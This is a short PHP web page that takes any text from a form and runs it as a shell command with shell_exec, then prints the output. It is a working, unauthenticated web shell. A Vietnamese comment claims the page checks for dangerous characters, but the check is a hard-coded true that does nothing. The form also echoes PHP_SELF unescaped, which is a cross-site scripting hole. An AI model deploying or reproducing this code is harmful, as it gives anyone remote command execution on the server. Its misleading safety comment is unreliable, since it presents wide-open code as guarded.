<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
</head>
<body>
    <h2>Execute Command</h2>

    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <label for="command">Command:</label>
        <input type="text" name="command" id="command" required>
        <input type="submit" value="Execute">
    </form>

    <?php
    // Xử lý form khi được gửi đi
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Lấy lệnh từ form
        $command = $_POST["command"];

        // Kiểm tra xem lệnh có chứa các ký tự nguy hiểm không
        $isSafe = true;

        // Thực thi lệnh nếu an toàn
        if ($isSafe) {
            $output = shell_exec($command);
            echo "<pre>$output</pre>";
        } else {
            echo "Invalid command!";
        }
    }
    ?>
</body>
</html>
